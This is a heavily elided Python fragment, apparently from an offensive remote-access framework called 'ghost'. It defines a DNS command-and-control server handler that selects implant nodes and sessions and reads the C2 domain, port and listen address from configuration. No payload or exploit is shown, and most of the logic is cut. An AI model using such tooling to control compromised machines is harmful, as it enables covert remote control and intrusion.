...
from ghost.network.lib.picocmd.server import (
    DnsCommandServerHandler, DnsCommandServer, SessionDependedCommand
)
from ghost.network.lib.picocmd.picocmd import (
...
from ghost.ghostlib.utils.listener import get_listener_ip_with_local, get_listener_port
...
class GhostDnsActivationHandler(object):
    __slots__ = ('config',)
...
class GhostDnsCommandServerHandler(DnsCommandServerHandler):
    def __init__(self, *args, **kwargs):
        ...
        if self.config:
            kwargs['activation'] = GhostDnsActivationHandler(
                self.config)
        ...
        if isinstance(node, basestring):
            ...
            for n in node.split(','):
                try:
                    ...
                    if nodes:
                        results = super(GhostDnsCommandServerHandler, self).find_nodes(
                            ','.join(nodes))
        ...
        if spi or node:
            ...
            if self.config and node:
                if isinstance(node, basestring):
                    ...
                    if nodes:
                        results = super(GhostDnsCommandServerHandler, self).find_sessions(
                            node=','.join(nodes))
                    else:
                        results = []
...
class GhostDnsCnc(object):
    def __init__(
        ...
        fdqn = self.config.get('ghostd', 'dnscnc').split(':')
        domain = fdqn[0]
        if len(fdqn) > 1:
            port = int(fdqn[1])
        else:
        ...
        listen = str(config.get('ghostd', 'address') or '0.0.0.0')

        recursor = config.get('ghostd', 'recursor')
        ...
        self.dns_handler = GhostDnsCommandServerHandler(
            domain, (
